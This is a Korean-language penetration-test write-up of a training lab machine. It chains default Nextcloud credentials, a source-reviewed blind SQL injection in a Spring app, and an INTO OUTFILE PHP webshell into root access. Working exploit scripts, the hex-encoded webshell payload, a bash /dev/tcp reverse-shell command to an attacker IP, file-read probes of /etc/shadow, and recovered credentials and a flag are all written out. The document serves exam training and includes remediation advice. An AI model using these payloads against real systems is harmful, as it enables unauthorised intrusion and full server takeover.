---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/web/sqli
  - tech/web/webdav
  - tech/web/default-creds
  - tech/db/mysql
  - tech/payload/revshell
type: machine
platform: pg
os: linux
ip: 192.168.248.147
ports: [22, 17445, 30455, 50080]
services: [http, ssh]
status: solved
manual_tags: true
tech_count: 5
---

> [!info] 요약
> 타겟 `192.168.248.147` · Arch Linux(`hawat`, 5.10.14-arch1-1) · Fundamental · 플래그 1개(`proof.txt` 만)
> 진입점: 50080 Nextcloud `admin:admin` → WebDAV 로 `issuetracker.zip` 회수 → 소스 리뷰로 SQLi 지점 확정 → 17445 Spring 앱에 자가 가입 → time-based blind SQLi + `INTO OUTFILE` 로 `/srv/http` 에 웹셸
> 권한상승: 없음 — nginx·php-fpm 이 root 로 구동되어 30455 웹셸이 곧 `uid=0`
> 시행착오·교훈 → [[_PLAYBOOK]]

## Target #1 – 192.168.248.147

### Initial Access – Nextcloud 기본 자격증명으로 회수한 소스에서 출력 채널 없는 SQLi 를 찾아 root 로 도는 웹루트에 웹셸 기록

**Vulnerability Explanation:** 네 결함이 체인됨.
- 50080 `/cloud` 의 Nextcloud 가 `admin:admin` 기본 자격증명으로 열림 — 저장된 `issuetracker.zip` 이 그대로 애플리케이션 전체 소스임
- 17445 Issue Tracker(Spring Boot 2.4.2)의 `/issue/checkByPriority` 가 `priority` 파라미터를 SQL 문자열에 연결 — `Statement` + 문자열 연결 = SQL 인젝션
- 같은 핸들러가 `executeQuery` 반환값을 버리고 `SQLException` 을 `printStackTrace()` 로 삼킨 뒤 **주입과 무관하게 전체 목록을 렌더** — UNION·에러 기반·Boolean 기반이 전부 죽고 time-based blind 와 `INTO OUTFILE` 부작용만 남음
- 30455 nginx 와 php-fpm 이 `user root;` 로 구동 — 그 웹루트에 쓴 PHP 가 `uid=0` 으로 실행되어 초기 접근이 곧 root

**Vulnerability Fix:**
- Nextcloud 기본 자격증명 변경, 소스 아카이브를 공유 스토리지에 두지 말 것
- `PreparedStatement` + `?` 바인딩으로 전환. 이 프로젝트는 나머지 전부가 Spring Data JPA 라 한 곳만 raw 로 남긴 것이 사고 원인
- DB 자격증명을 소스에 평문 하드코딩하지 말 것 — 소스 유출이 즉시 자격증명 유출이 됨
- nginx `user http;` 로 비특권 계정 지정. **이 한 줄만 고쳤어도 root RCE 가 아니라 웹 사용자 RCE 에 그침**
- 애플리케이션 DB 계정에서 `FILE` 권한 회수, `secure_file_priv` 를 명시적 디렉터리로 고정, 웹루트 0777 해제
- 자가 가입(`POST /user/register` 가 `permitAll`)을 관리자 승인·초대 기반으로 전환

**Severity:** Critical — 무인증 자격증명 재사용에서 시작해 즉시 root 원격 코드 실행에 도달

**Steps to reproduce the attack:**
1. `-p-` 전수 스캔으로 고번호 웹 포트 3개(17445·30455·50080) 확보
2. 50080 `/cloud` Nextcloud 에 `admin:admin` 로그인, WebDAV 로 `issuetracker.zip` 다운로드
3. 소스 리뷰로 `IssueController.checkByPriority` 의 문자열 연결 SQL 과 `permitAll` 자가 가입 경로 확정
4. `POST /user/register` 로 계정 생성 후 `POST /login` 으로 세션 획득
5. `POST /issue/checkByPriority` 에 `Normal' UNION SELECT sleep(5)-- ` 를 보내 응답 지연으로 주입 성립 확인
6. `INTO OUTFILE` 로 `/tmp` 마커 파일을 써 파일 쓰기 가능 여부 확인
7. 웹셸 본문을 hex 리터럴로 감싸 `/srv/http/rce.php` 에 기록
8. `http://<타겟>:30455/rce.php?cmd=id` 로 `uid=0` 확인 후 443 리버스셸 회수

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.248.147 | TCP: 22, 17445, 30455, 50080 |

포트 스캔은 두 번 돌림 — `-p-` 전수(`allports.nmap`, 09:15:39~09:16:23, 44초)와 `-sCV -A` 전수(`nmap.log`, 09:15:12~09:16:03, 51초). 이어 열린 4포트에만 `-sV -sC` 재확인(`services.nmap`).

```text
# Nmap 7.98 scan initiated Thu Aug 20 09:15:12 2026 as: /usr/lib/nmap/nmap -sCV -p- -Pn -A --min-rate 5000 -oN /home/kali/PG/Hawat/nmap.log 192.168.248.147
Nmap scan report for 192.168.248.147
Host is up (0.085s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT      STATE  SERVICE      VERSION
22/tcp    open   ssh          OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey: 
|   3072 78:2f:ea:84:4c:09:ae:0e:36:bf:b3:01:35:cf:47:22 (RSA)
|   256 d2:7d:eb:2d:a5:9a:2f:9e:93:9a:d5:2e:aa:dc:f4:a6 (ECDSA)
|_  256 b6:d4:96:f0:a4:04:e4:36:78:1e:9d:a5:10:93:d7:99 (ED25519)
111/tcp   closed rpcbind
139/tcp   closed netbios-ssn
443/tcp   closed https
445/tcp   closed microsoft-ds
17445/tcp open   http         Apache Tomcat (language: en)
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-title: Issue Tracker
30455/tcp open   http         nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: W3.CSS
50080/tcp open   http         Apache httpd 2.4.46 ((Unix) PHP/7.4.15)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: W3.CSS Template
|_http-server-header: Apache/2.4.46 (Unix) PHP/7.4.15
Aggressive OS guesses: Linux 5.0 - 5.14 (98%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (97%), Linux 4.15 - 5.19 (94%), Linux 2.6.32 - 3.13 (93%), OpenWrt 22.03 (Linux 5.10) (92%), Linux 3.10 - 4.11 (91%), Linux 5.0 (91%), Linux 3.2 - 4.14 (90%), Linux 2.6.32 - 3.10 (90%), Linux 4.15 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   83.90 ms 192.168.45.1
2   83.85 ms 192.168.45.254
3   84.51 ms 192.168.251.1
4   84.56 ms 192.168.248.147
```
— 출처: `~/PG/Hawat/nmap.log`

**80 이 없음.** 웹이 전부 고번호 포트(17445·30455·50080)에 있어 상위 1000 포트만 훑으면 SSH 하나만 보고 끝남. `Not shown: 65527 filtered` — 나머지는 무응답 필터링임.

⚠️ `443/tcp closed` 는 **인바운드** 스캔 결과임. 아웃바운드 egress 정책의 근거가 아님 — 이 구분은 `Initial Access` 재현 절의 리버스셸 항목에서 다시 다룸.

**버전 판정 — 독립 근거 2개**

OS(커널 5.10 계열 Arch):
1. 30455 `phpinfo.php` 의 `System` 필드 — `Linux hawat 5.10.14-arch1-1 #1 SMP PREEMPT Sun, 07 Feb 2021 x86_64`. 엔드포인트 존재는 `~/PG/Hawat/gob_30455.txt`(`/phpinfo.php` 200, 68610B)로 확인됨. 본문 자체는 산출물로 미보존(원 노트 기록)
2. nmap OS 추정 — `Linux 5.0 - 5.14 (98%)`. 커널 5.10 과 모순 없음

17445 Issue Tracker(Spring Boot 2.4.2 / Java 11 / 내장 Tomcat):
1. 회수 소스 `pom.xml` — `spring-boot-starter-parent` `2.4.2`, `<java.version>11</java.version>`
2. nmap 배너 `Apache Tomcat (language: en)` — Spring Boot 내장 Tomcat 과 일치. `application.properties` 의 `server.port=17445` 가 실제 리슨 포트와 같아 **이 소스가 그 앱임**이 교차 확인됨

| 포트 | 제품 | 판정 근거 |
|---|---|---|
| 17445 | Spring Boot 2.4.2 / Java 11 / 내장 Tomcat — "Issue Tracker" | `pom.xml` · `application.properties` `server.port=17445` · nmap 배너 |
| 30455 | nginx 1.18.0 + PHP 7.4.15 (FPM) | nmap `http-server-header: nginx/1.18.0` · `phpinfo.php` 의 `Server API = FPM/FastCGI`(원 노트 기록 — 본문 산출물 미보존) |
| 50080 | Apache 2.4.46 + PHP 7.4.15, `/cloud` 에 Nextcloud 20.0.7.1 | nmap `Apache/2.4.46 (Unix) PHP/7.4.15` · `status.php` → `{"version":"20.0.7.1","productname":"Nextcloud"}` (원 노트 기록 — 응답 본문은 산출물 미보존) |

> [!tip] Arch Linux 라는 사실이 경로 관례를 바꾼다
> 데비안·우분투의 `/var/www/html` 이 아니라 **`/srv/http`**(Arch nginx 기본)를 씀. 이 판정이 뒤의 웹셸 투하 경로를 통째로 결정함.
> `phpinfo.php` 가 노출돼 있으면 `System`·`DOCUMENT_ROOT`·`SCRIPT_FILENAME`·`disable_functions`·`open_basedir` 을 한 번에 얻음.

**디렉터리 열거**

```text
/4                    (Status: 301) [Size: 169] [--> http://192.168.248.147:30455/4/]
/index.php            (Status: 200) [Size: 3356]
/index.php            (Status: 200) [Size: 3356]
/phpinfo.php          (Status: 200) [Size: 68610]
/phpinfo.php          (Status: 200) [Size: 68610]
```
— 출처: `~/PG/Hawat/gob_30455.txt`

30455 는 `index.php` 만 있고 `index.html` 은 없음. 이 사실이 뒤에서 웹루트 존재 확인을 헛디디게 만듦.

```text
/.htpasswd            (Status: 403) [Size: 980]
/~root                (Status: 403) [Size: 980]
/4                    (Status: 301) [Size: 239] [--> http://192.168.248.147:50080/4/]
/cgi-bin/             (Status: 403) [Size: 994]
/images               (Status: 301) [Size: 244] [--> http://192.168.248.147:50080/images/]
/index.html           (Status: 200) [Size: 9088]
/index.html           (Status: 200) [Size: 9088]
```
— 출처: `~/PG/Hawat/gob_50080.txt`(발췌 — 403 만 뱉는 `.ht*`·`~user` 계열 다수 생략)

50080 워드리스트 열거에는 `/cloud` 가 안 잡힘. Nextcloud 는 별도로 도달함.

**세 화면**

![[PG-Hawat-50080_cloud_login.png]]
50080 `/cloud` — Nextcloud 로그인 화면.

![[PG-Hawat-17445_issuetracker.png]]
17445 `/` — Issue Tracker 인덱스. 무인증으로 열림(`WebSecurityConfig` 의 `permitAll` 에 `/` 포함). **Priority 열의 실제 값이 `Unbreak`·`Normal`** 이라 주입 페이로드의 기저 값을 `Normal` 로 잡음.

![[PG-Hawat-30455_root.png]]
30455 `/` — W3.CSS 템플릿(`index.php`). nmap 의 `http-title: W3.CSS` 와 일치. 이 페이지를 서빙하는 디렉터리가 뒤에 웹셸을 심을 `/srv/http` 임.

### Initial Access – blind SQLi → `INTO OUTFILE` 웹셸

수동 UNION SQLi 의 일반 절차와 엔진 지문 치트시트는 [[_PLAYBOOK#B-12. SQLi 수동 UNION — sqlmap 금지 대비]].

⚠️ **출처 캡션(`— 출처: ~/PG/Hawat/...`)이 붙은 블록만 산출물로 보존돼 있음.** 캡션 없는 출력 블록(응답 코드·응답 시간·`id` 결과·리버스셸·`ps`·플래그)은 셸 안에서 친 명령이라 파일로 남지 않았고 **원 노트 기록**임.

> [!danger] 시험 금지 도구 — sqlmap
> 이 구간은 sqlmap 이면 자동이나 **OSCP 시험에서 sqlmap 은 명시적 금지**임. 이 절의 ⑤~⑧ 수동 절차가 시험용 자산임.

**① 소스 회수 — Nextcloud WebDAV**

Nextcloud 가 `admin:admin` 으로 열림. 브라우저 UI 대신 WebDAV 엔드포인트를 직접 때림 — 세션·CSRF 처리가 불필요해 그대로 자동화됨.

```bash
curl -u admin:admin -X PROPFIND \
  'http://192.168.248.147:50080/cloud/remote.php/dav/files/admin/'
curl -u admin:admin -o issuetracker.zip \
  'http://192.168.248.147:50080/cloud/remote.php/dav/files/admin/issuetracker.zip'
md5sum issuetracker.zip && unzip -q issuetracker.zip -d src/
```

```text
cd816a09d8608c3b24b4e8c5c212640c  issuetracker.zip
```
— 출처: `~/PG/Hawat/issuetracker.zip`(164010B, 09:17:14) · `~/PG/Hawat/src/issuetracker/`. md5 는 2026-08-26 재계산으로 일치 확인

`/remote.php/dav/files/<사용자명>/` 이 그 사용자의 파일 루트임. `PROPFIND` 로 목록, `GET` 으로 다운로드, `PUT` 으로 업로드. Nextcloud·ownCloud 를 만나면 이 경로를 먼저 쓸 것.

**② 취약 코드 — 문자열 연결 한 곳**

`src/main/java/com/issue/tracker/issues/IssueController.java` 60~85행:

```java
	@GetMapping("/issue/checkByPriority")
	public String checkByPriority(@RequestParam("priority") String priority, Model model) {
		// 
		// Custom code, need to integrate to the JPA
		//
	    Properties connectionProps = new Properties();
	    connectionProps.put("user", "issue_user");
	    connectionProps.put("password", "ManagementInsideOld797");
        try {
			conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/issue_tracker",connectionProps);
		    String query = "SELECT message FROM issue WHERE priority='"+priority+"'";
            System.out.println(query);
		    Statement stmt = conn.createStatement();
		    stmt.executeQuery(query);

        } catch (SQLException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
		
        // TODO: Return the list of the issues with the correct priority
		List<Issue> issues = service.GetAll();
		model.addAttribute("issuesList", issues);
		return "issue_index";
        
	}
```
— 출처: `~/PG/Hawat/src/issuetracker/src/main/java/com/issue/tracker/issues/IssueController.java` 60~85행

`priority` 가 작은따옴표 문자열 리터럴 안에 그대로 이어붙음. 입력에 `'` 를 넣으면 문자열이 조기 종료되고 그 뒤가 SQL 문법으로 해석됨. `PreparedStatement` 에 `?` 바인딩을 썼다면 입력이 데이터로만 취급되어 발생하지 않았을 것.

DB 자격증명이 코드에 평문임 — **`issue_user` / `ManagementInsideOld797`**. `src/main/resources/application.properties` 에도 같은 값이 있음. **root 계정이 아님.**

⚠️ **회수 소스는 `@GetMapping` 인데 실제 배포본은 POST 를 받음.** 이 박스의 모든 주입 요청이 `POST /issue/checkByPriority` 로 성립함(`oracle.sh`·`exploit.py`·`probe.py`·`blind.py`·`shell.py` 전부 POST). 소스는 「어디에 취약점이 있는가」의 지도이지 「어떻게 호출하는가」의 정답지가 아님 — 실제 배포본은 `/home/clinton/tracker-0.0.1-SNAPSHOT.jar` 임.

프로젝트 전체에서 SQL 을 문자열로 조립하는 곳은 여기 한 곳뿐임. 나머지는 전부 Spring Data JPA(파라미터 바인딩):

```text
./src/main/java/com/issue/tracker/issues/IssueController.java:6:import java.sql.Statement;
./src/main/java/com/issue/tracker/issues/IssueController.java:72:		    Statement stmt = conn.createStatement();
./src/main/java/com/issue/tracker/issues/IssueController.java:73:		    stmt.executeQuery(query);
```
— `grep -rn -iE 'createQuery|createNativeQuery|Statement|executeQuery|jdbcTemplate|@Query' --include='*.java' .` 를 회수 소스 트리에 실행한 결과(2026-08-26 재실행)

**③ 출력 채널이 없음 — 이 박스의 난점**

세 줄이 채널을 차례로 닫음.

| 코드 | 결과 |
|---|---|
| `stmt.executeQuery(query);` — 반환값을 변수에 담지 않음(73행) | 쿼리 결과가 화면에 안 나옴 → **UNION 추출 불가** |
| `catch { e1.printStackTrace(); }` — 예외를 삼킴(77행) | 에러 메시지가 응답에 안 나옴 → **에러 기반 불가** |
| `service.GetAll()` — 주입과 무관하게 항상 전체 목록 렌더(81행) | 응답 길이 차이로도 구분 불가 → **Boolean 기반도 어려움** |

남는 채널은 둘 — time-based blind(`SLEEP()` 로 참·거짓을 응답 시간으로 읽음)와 부작용(`INTO OUTFILE` 로 파일을 씀).

스택 쿼리(`; DROP ...`)는 불가. 주입이 도는 커넥션은 컨트롤러가 직접 여는 `jdbc:mysql://localhost:3306/issue_tracker` 인데 여기에도 `application.properties` 의 URL(`...?serverTimeZone=UTC`)에도 `allowMultiQueries` 파라미터가 없고, MySQL Connector/J 기본값이 `false` 라 세미콜론 뒤가 실행되지 않음. **이 판단을 소스만 보고 미리 내려 UNION 추출로 헤매는 시간을 아꼈음.**

**④ 인증 우회 — 자가 가입**

```java
             .csrf().disable()
			.authorizeRequests()
				.antMatchers("/", "/index", "/register", "/user/register", "/css/**", "/js/**").permitAll()
				.anyRequest().authenticated()
```
— 출처: `~/PG/Hawat/src/issuetracker/src/main/java/com/issue/tracker/config/WebSecurityConfig.java` 27~30행

`/issue/checkByPriority` 는 `permitAll` 목록에 없어 `.anyRequest().authenticated()` 에 걸림(실측: 302 → `/login`). 그런데 **`/register` 와 `POST /user/register` 가 `permitAll`** 이라 아무나 계정을 만들 수 있음. `csrf().disable()` 이라 토큰 파싱도 불필요 — `curl` 한 줄로 끝남.

![[PG-Hawat-17445_register.png]]
`/register` — 무인증으로 열리는 가입 폼. 화면에 보이는 입력은 Username·Password 둘뿐이고 `userId` 는 hidden 임.

```bash
curl -s -c cj.txt -o /dev/null -w '%{http_code}\n' -X POST \
  -d 'username=pwnaudit&password=Pwn123abc&userId=0' \
  http://192.168.248.147:17445/user/register
curl -s -c cj.txt -b cj.txt -o /dev/null -w '%{http_code}\n' -X POST \
  -d 'username=pwnaudit&password=Pwn123abc' \
  http://192.168.248.147:17445/login
```

```text
302
302
```

세션 쿠키가 파일로 남음:

```text
#HttpOnly_192.168.248.147	FALSE	/	FALSE	0	JSESSIONID	B34662FE772408160D338A8CF10CE741
```
— 출처: `~/PG/Hawat/cj.txt`(09:18:24). 뒤에 재로그인한 두 번째 세션은 `cj2.txt`(09:25:42, `JSESSIONID 208A853740AD4A74DB012306F660EA35`)

`userId=0` 을 함께 보낸 근거는 회수 소스임 — 가입 폼 `user_form.html` 35행이 `<input th:field="*{UserId}" type="hidden"/>` 이라 브라우저는 항상 `userId` 를 실어 보냄. `Users` 엔티티의 `userId` 는 `int` 원시형(`Users.java` 25행)이라 **빈 문자열을 보내면** 타입 불일치로 400 이 됨.
⚠️ `[가정]` 원 노트는 「`userId=0` 을 **빼면** HTTP 400」이라고 적었으나, 필드를 아예 생략한 요청의 응답은 산출물에 남아 있지 않음. 소스로 확인되는 것은 **빈 값 전송 시** 원시형 바인딩이 실패한다는 것까지임.

**⑤ 주입 성립 확인 — time-based**

```bash
curl -s -b cj.txt -o /dev/null -w 'baseline %{time_total}s\n' -X POST \
  --data-urlencode "priority=Normal" \
  http://192.168.248.147:17445/issue/checkByPriority
curl -s -b cj.txt -o /dev/null -w 'sleep    %{time_total}s\n' -X POST \
  --data-urlencode "priority=Normal' UNION SELECT sleep(5)-- " \
  http://192.168.248.147:17445/issue/checkByPriority
```

```text
baseline 0.18s
sleep    5.18s
```

0.18초 → 5.18초. 정확히 5초가 늘어 인젝션 성립.

페이로드 조각별 역할:

| 조각 | 역할 |
|---|---|
| `Normal` | 원래 값. 쿼리를 문법적으로 자연스럽게 유지 |
| `'` | 문자열 리터럴을 조기 종료 |
| `UNION SELECT sleep(5)` | 원 쿼리(`SELECT message ...`)와 컬럼 수 1개로 일치시켜 결합. `sleep(5)` 가 5초 지연 |
| `-- ` | 이후를 주석 처리. **뒤의 공백이 필수** — MySQL 은 `--` 다음에 공백·개행이 있어야 주석으로 인식 |

`--data-urlencode` 를 쓰는 이유는 페이로드에 `'`·공백·`(`·`)` 가 섞여 손으로 인코딩하면 실수하기 쉬워서임. curl 에 맡길 것.

이 오라클을 셸 함수로 고정해 재사용:

```bash
#!/bin/bash
# $1 = SQL boolean condition. Prints elapsed time; >4s == TRUE
T=$(curl -s -o /dev/null -w '%{time_total}' -m 60 -b ~/PG/Hawat/cj.txt   -X POST 'http://192.168.248.147:17445/issue/checkByPriority'   --data-urlencode "priority=Normal' UNION SELECT IF(($1),sleep(5),0)-- ")
echo "[$T] $1"
```
— 출처: `~/PG/Hawat/oracle.sh`(09:18:41)

한 글자씩 뽑는 이진 탐색 추출기도 같은 오라클 위에 올림 — `ASCII(SUBSTRING(expr,i,1))>mid` 를 8회 반복해 한 문자를 확정하고, 문자 위치별로 16 스레드 병렬. 지연은 5초가 아니라 **1.5초**로 낮추고 판정 임계는 1.0초:

```python
def ask(cond):
    p="Normal' UNION SELECT IF(("+cond+"),sleep("+str(SLEEP)+"),0)-- "
    for _ in range(3):
        try:
            t0=time.time()
            requests.post(T+'/issue/checkByPriority',data={'priority':p},cookies=CK,timeout=60)
            return (time.time()-t0)>THRESH
        except Exception:
            time.sleep(1)
    return False

def getchar(expr,i):
    lo,hi=0,255
    while lo<hi:
        mid=(lo+hi)//2
        if ask('ASCII(SUBSTRING(%s,%d,1))>%d'%(expr,i,mid)): lo=mid+1
        else: hi=mid
    return lo
```
— 출처: `~/PG/Hawat/blind.py`(09:22:38)

**⑥ 파일 쓰기 가능 여부**

`INTO OUTFILE` 성립에는 셋이 필요함 — DB 사용자의 `FILE` 권한, `@@secure_file_priv` 값, 대상 디렉터리가 mysqld 프로세스 소유자에게 쓰기 가능한지. 던지기 전에 마커 파일로 실측:

```python
def outfile(path):
    h='0x'+('TESTMARKER').encode().hex()
    raw("Normal' UNION SELECT "+h+" INTO OUTFILE '"+path+"'-- ")
    return oracle("load_file('"+path+"') IS NOT NULL")

print('== OUTFILE capability ==')
outfile('/tmp/hwt_marker.txt')
print('== mysqld privilege level ==')
for f in ['/root/proof.txt','/root/.bash_history','/etc/shadow']:
    oracle("load_file('"+f+"') IS NOT NULL")
print('== nextcloud / webroot discovery ==')
for f in ['/usr/share/webapps/nextcloud/config/config.php',
          '/usr/share/nginx/html/cloud/config/config.php',
          '/usr/share/httpd/index.html',
          '/srv/www/index.html',
          '/home/issue/local.txt',
          '/etc/passwd']:
    oracle("load_file('"+f+"') IS NOT NULL")
```
— 출처: `~/PG/Hawat/probe.py`(09:21:21). 스크립트가 stdout 으로만 출력해 **응답 결과는 파일로 미보존**

`/tmp` 마커 쓰기는 성공. 반면 `/root/proof.txt`·`/etc/shadow` 는 `load_file()` 이 `NULL` — **mysqld 는 root 가 아님.**

> [!warning] `@@secure_file_priv IS NULL` 이 TRUE 인데도 쓰기가 됐다
> 교과서대로면 `NULL` 은 파일 입출력 전면 차단임. 그런데 `load_file()` 도 `INTO OUTFILE` 도 동작함. **변수값보다 실측을 믿을 것** — `/tmp` 에 마커 파일을 하나 쓰는 것이 가장 빠른 판정임.
> ⚠️ 이 오라클의 응답은 산출물에 남아 있지 않음(원 노트 기록). `probe.py` 는 `secure_file_priv` 를 묻지 않음.

**⑦ 어느 웹루트에 쓸 것인가 — 이 박스의 진짜 함정**

웹서버가 둘이라 쓰는 위치에 따라 웹셸의 실행 권한이 달라짐. `/etc/httpd/conf/httpd.conf` 를 blind SQLi 로 읽어 확인한 결과(원 노트 기록 — 추출 원문은 산출물 미보존):

| 포트 | 서버 | DocumentRoot | 디렉터리 권한 | 웹셸 uid |
|---|---|---|---|---|
| 50080 | Apache + PHP | `/srv/apache` | 0777 | `uid=33(http)` |
| 30455 | nginx + PHP-FPM | `/srv/http` | 0777 | **`uid=0(root)`** |
| — | (nginx 기본) | `/usr/share/nginx/html` | 0755 root | 쓰기 실패 |

> [!danger] root RCE 의 원인은 MySQL 이 아니다
> 흔한 오해 — 「MySQL 이 root 로 도니까 root 웹셸이 된다」. **틀림.** `ps` 로 확인하면 mysqld 는 `mysql` 사용자로 돎:
> ```text
> [root@hawat http]# ps -o user=,comm= -C mysqld -C mariadbd
> mysql    mariadbd
> ```
> `load_file('/root/proof.txt')`·`load_file('/etc/shadow')` 가 전부 `NULL` 인 것이 같은 증거임.
>
> 진짜 원인은 `/etc/nginx/nginx.conf` 의 **`user root;`** 임. nginx 와 php-fpm7 이 둘 다 root 로 구동되므로 30455 에 올린 PHP 는 무엇이든 uid 0 으로 실행됨:
> ```text
> root     nginx
> root     php-fpm7
> ```
> ⚠️ 위 `ps` 두 블록은 **원 노트 기록**임 — 리버스셸 안에서 친 명령이라 `~/PG/Hawat/` 에도 `~/.zsh_history` 에도 남지 않음.
> **웹셸을 심을 때는 「누가 그 PHP 를 실행하는가」를 먼저 확인할 것** — `ps aux | grep -E 'nginx|apache|php-fpm'` 한 줄이면 됨. 같은 부류: [[_PLAYBOOK#B-34. root 로 도는 서비스의 «쓰기 가능한» 경로 = 권한상승]]

**⑧ 웹셸 작성**

```sql
Normal' UNION SELECT 0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e INTO OUTFILE '/srv/http/rce.php'-- 
```

투하 스크립트는 경로를 인자로 받아 쓰고 즉시 `load_file()` 오라클로 성공 여부를 되묻는 구조임:

```python
php='<?php system($_GET["cmd"]); ?>'
h='0x'+php.encode().hex()
for path in sys.argv[1:]:
    sql="Normal' UNION SELECT "+h+" INTO OUTFILE '"+path+"'-- "
    print('[*]',sql)
    raw(sql)
    oracle("load_file('"+path+"') IS NOT NULL")
```
— 출처: `~/PG/Hawat/shell.py`(09:23:20)

> [!tip] 페이로드를 hex 리터럴로 넘기는 이유
> 웹셸 원문은 `<?php system($_GET["cmd"]); ?>` 인데 따옴표·`$`·`<`·`>` 가 섞여 있음. curl → HTTP → JDBC → SQL 파서로 내려가며 인용이 네 겹으로 중첩되어 반드시 깨짐.
> MySQL 은 `0x...` 형태의 hex 문자열 리터럴을 그대로 받으므로 인용 문제가 통째로 사라짐.
> ```bash
> echo -n '<?php system($_GET["cmd"]); ?>' | xxd -p | tr -d '\n'
> ```
> [[Squid]] 의 `INTO DUMPFILE` + hex, [[Exfiltrated]] 의 base64 래핑과 같은 계열임([[_PLAYBOOK#B-81. 페이로드는 base64로 감싼다]]).

```bash
curl -s 'http://192.168.248.147:30455/rce.php?cmd=id'
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

**곧바로 root.** 권한상승 단계가 없음.

`UNION` 이라 원 쿼리의 `message` 행들이 먼저 출력되고 그 뒤에 웹셸이 붙음. PHP 는 `<?php` 태그 밖을 그냥 텍스트로 출력할 뿐이라 실행에 지장 없음. 깔끔하게 하려면 `INTO DUMPFILE`(단일 행, 가공 없음)을 쓸 것.

**⑨ 리버스셸**

```bash
tmux new-session -d -s hawat 'sudo rlwrap nc -lvnp 443'
curl -G --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/192.168.45.207/443 0>&1" &' \
  http://192.168.248.147:30455/rce.php
```

```text
listening on [any] 443 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.248.147] 60994
[root@hawat http]# id
uid=0(root) gid=0(root) groups=0(root)
```

443 리스너는 1024 미만 포트라 `sudo` 가 필요함.

> [!warning] 「아웃바운드가 443만 열려 있다」는 `[가정]` 이다
> 확실한 것은 **성공 회선이 tcp/443** 이라는 것뿐임. 다른 포트를 시도한 기록이 산출물에 없어 「4444 는 안 붙는다」는 관측이 아님.
> 원 노트는 nmap 의 `443/tcp closed` 를 근거로 들었으나 그것은 **인바운드** 스캔 결과라 아웃바운드 egress 정책을 말해주지 않음. 계층별 진단 절차는 [[_PLAYBOOK#A-31. 리버스셸이 안 붙는다]].

> [!warning] `python3` 가 없어 TTY 업그레이드 실패
> Arch 최소 설치라 `python3` 도 `hostname` 도 없음:
> ```text
> bash: python3: command not found
> ```
> 이 박스에서 통한 대안은 `script -qc /bin/bash /dev/null`. 그 밖의 후보는 `perl -e 'exec "/bin/bash";'` · `/usr/bin/expect -c 'spawn /bin/bash; interact'`.
> **`python3 -c 'import pty...'` 를 반사적으로 치지 말 것.**

**Local.txt value:**
**없음.** 이 박스는 플래그가 `proof.txt` 하나뿐임. 근거 둘 — 셸에서 `find / -xdev -name local.txt 2>/dev/null` 이 빈 결과였고, 포털 진행도의 **플래그 슬롯 자체가 1개**임(`_AUDIT\portal-진행도-실측-20260820.md` 전수 조회에서 Hawat `1/1`). `/home` 에는 `clinton` 하나뿐이고 dotfile 과 `tracker-0.0.1-SNAPSHOT.jar` 만 있음(원 노트 기록 — 디렉터리 목록은 산출물 미보존) — 사용자 단계 없이 root 로 직행하는 구성임.

### Privilege Escalation – 없음 (nginx·php-fpm 이 root 로 구동되어 초기 접근이 곧 root)

**Vulnerability Explanation:** 별도 권한상승 취약점 없음. 30455 를 서빙하는 nginx·php-fpm7 이 `user root;` 로 구동되어, 그 웹루트에 심은 PHP 가 최초 명령 실행부터 uid 0.

**Vulnerability Fix:** 해당 없음 — `Initial Access` 의 Fix 중 「nginx `user http;` 로 비특권 계정 지정」이 이 항목도 함께 닫음.

**Severity:** 해당 없음 — 심각도는 `Initial Access` 에 계상(Critical).

**Steps to reproduce the attack:** 해당 없음 — 추가 단계 없이 웹셸 첫 명령이 root.

근거는 셋.

- 웹셸 첫 명령이 이미 `uid=0(root) gid=0(root) groups=0(root)`
- 리버스셸 프롬프트가 `[root@hawat http]#`
- 원인은 `/etc/nginx/nginx.conf` 의 `user root;` — nginx 와 php-fpm7 이 둘 다 root 로 구동. `Initial Access` 재현 절 ⑦ 참조

같은 패턴이 [[Hub]](FuguHub `User=root`)에도 있음. 셸을 잡자마자 `id` 를 치는 습관이 여기서 열거 단계를 통째로 생략시킴.

```text
[root@hawat http]# id
uid=0(root) gid=0(root) groups=0(root)
```

### Post-Exploitation

**Proof.txt value:**
`8f7bb63791bc513b2a25a674068314dc`

```text
[root@hawat http]# cat /root/proof.txt
8f7bb63791bc513b2a25a674068314dc
[root@hawat http]# ls /root
proof.txt
[root@hawat http]# find / -xdev -name local.txt 2>/dev/null
       (없음)
```

⚠️ **증거 형식의 한계** — `~/PG/Hawat/` 에 `proof_user.txt`·`proof_root.txt` 가 없음. `whoami; id; hostname; hostname -I; date; cat /root/proof.txt` 를 한 화면으로 묶은 출력이 파일로 남지 않았음. 「대화형 셸에서 읽었다」의 근거는 `Post-Exploitation` 절과 `Privilege Escalation` 절에 실린 pty 프롬프트(`[root@hawat http]#`)뿐이고, 그 tmux 스크롤백도 보존되지 않음.
이 박스는 `hostname` 바이너리가 없으므로 시험 증거 형식에서는 `uname -n` 또는 `cat /etc/hostname` 으로 대체할 것.

**남긴 흔적**

| 항목 | 상태 |
|---|---|
| `/srv/http/rce.php` (root 웹셸) | 남아 있음 — 랩 Stop/Revert 로 소멸 |
| `/srv/apache/rce.php` (`uid=33(http)` 웹셸) | 남아 있음 |
| DB `issue_tracker` 의 `user` 테이블에 `pwnaudit` 계정 | 남아 있음 |
| `/tmp/hwt_marker.txt`, `/tmp/jx/` | 삭제 완료 |

획득 자격증명 — `issue_user` / `ManagementInsideOld797`(MySQL), Nextcloud `admin` / `admin`.

Kali 쪽 정리 — tmux 세션 `hawat` 종료, 443 리스너 해제. NFS 마운트 없음.

## 관련

